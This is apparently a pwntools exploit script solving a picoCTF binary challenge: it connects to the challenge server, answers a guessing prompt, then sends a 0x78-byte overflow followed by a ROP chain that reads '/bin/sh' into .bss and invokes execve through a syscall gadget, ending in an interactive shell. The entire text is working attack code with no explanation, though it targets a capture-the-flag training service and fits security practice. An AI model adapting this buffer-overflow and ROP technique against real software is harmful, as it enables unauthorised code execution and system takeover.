from pwn import *

r = remote("shape-facility.picoctf.net", 61820)
#r = process("./vuln")

elf = ELF("./vuln")
rop = ROP(elf)   # initialize pwntools' gadget finder

# === dynamically resolve gadgets ===
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]

read = elf.symbols['read']     # better than hardcoding
bss = elf.bss()                # gives start of .bss

log.info(f"pop rax = {hex(pop_rax)}")
log.info(f"pop rdi = {hex(pop_rdi)}")
log.info(f"pop rsi = {hex(pop_rsi)}")
log.info(f"pop rdx = {hex(pop_rdx)}")
log.info(f"syscall = {hex(syscall)}")
log.info(f"read = {hex(read)}")
log.info(f"bss = {hex(bss)}")

# === interact with challenge ===
r.sendlineafter(b"What number would you like to guess?\n", b"84")

payload  = b"A" * 0x78
payload += p64(pop_rdi) + p64(0)        # stdin
payload += p64(pop_rsi) + p64(bss)      # write into bss
payload += p64(pop_rdx) + p64(8)        # 8 bytes
payload += p64(read)

payload += p64(pop_rax) + p64(0x3b)     # execve syscall
payload += p64(pop_rdi) + p64(bss)      # "/bin/sh"
payload += p64(pop_rsi) + p64(0)        # argv
payload += p64(pop_rdx) + p64(0)        # envp
payload += p64(syscall)

pause()
r.sendlineafter(b"New winner!\nName? ", payload)
r.send(b"/bin/sh\x00")

r.interactive()
